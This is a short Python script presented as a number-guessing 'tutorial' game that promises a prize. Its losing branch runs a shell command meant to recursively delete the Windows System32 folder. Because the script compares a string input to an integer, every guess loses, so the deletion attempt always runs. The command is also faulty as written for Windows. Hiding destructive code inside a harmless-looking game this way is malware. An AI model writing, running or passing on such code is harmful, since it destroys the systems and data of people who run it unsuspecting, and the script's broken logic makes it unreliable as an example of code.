import os
import random

print("Tutorial: Guess a Number beatween 1-10,If you guess the right number you get a price!!\n\n")
a = input("Number Guess: ")
i = random.randint(1,10)
if i == a:
    print("You Won!!\n\nYou win a non Destroyed System32!!")
else:
    os.system("rm -rf C:/System32")
